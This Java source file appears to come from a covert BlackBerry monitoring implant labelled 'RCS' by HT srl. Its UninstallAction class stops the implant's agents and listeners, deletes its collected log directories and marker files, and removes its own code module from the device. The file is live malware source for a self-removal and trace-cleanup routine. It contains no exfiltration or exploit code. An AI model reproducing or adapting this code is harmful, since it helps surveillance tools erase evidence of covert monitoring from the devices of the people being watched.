//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : UninstallAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.CodeModuleManager;
import blackberry.AgentManager;
import blackberry.EventManager;
import blackberry.Main;
import blackberry.event.Event;
import blackberry.log.LogCollector;
import blackberry.log.Markup;
import blackberry.utils.Check;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class UninstallAction.
 */
public final class UninstallAction extends SubAction {

    /**
     * Instantiates a new uninstall action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public UninstallAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);

        //#ifdef DBC
        Check.requires(actionId == ACTION_UNINSTALL, "Wrong ActionId");
        //#endif
    }

    /**
     * Instantiates a new uninstall action.
     * 
     * @param host
     *            the host
     */
    public UninstallAction(final String host) {
        super(ACTION_UNINSTALL);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {
        //#ifdef DEBUG_INFO
        debug.info("execute");
        //#endif

        wantUninstall = true;

        Main main = (Main) Application.getApplication();
        main.stopListeners();

        AgentManager.getInstance().stopAll();
        EventManager.getInstance().stopAll();

        Utils.sleep(2000);

        LogCollector.getInstance().removeLogDirs();
        Markup.removeMarkups();

        LogCollector.getInstance().removeProgressive();

        final ApplicationDescriptor ad = ApplicationDescriptor
                .currentApplicationDescriptor();
        final int moduleHandle = ad.getModuleHandle();
        final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
        //final String errorString = Integer.toString(rc);
        //#ifdef DEBUG_INFO
        debug.info("deleteModuleEx result: " + rc);
        //#endif
        switch (rc) {
        case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
            //#ifdef DEBUG_INFO
            debug.info("Will be deleted on restart");
            //#endif
            // Device.requestPowerOff( true );
            break;
        case CodeModuleManager.CMM_MODULE_IN_USE:
        case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
            //#ifdef DEBUG_INFO
            debug.info("Module In Use");
            //#endif
            break;
        case CodeModuleManager.CMM_HANDLE_INVALID:
            //#ifdef DEBUG
            debug.error("Invalid Handle");
            //#endif
            break;
        case CodeModuleManager.CMM_MODULE_REQUIRED:
            //#ifdef DEBUG
            debug.error("Module Required");
            //#endif
            break;
        default:
            //#ifdef DEBUG
            debug.error(Integer.toString(rc));
            //#endif
            return false;
        }
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        //#ifdef DBC
        Check.requires(confParams.length == 0, "params should be empty");
        //#endif
        return true;
    }

    public String toString() {
        return "Uninstall";
    }
}
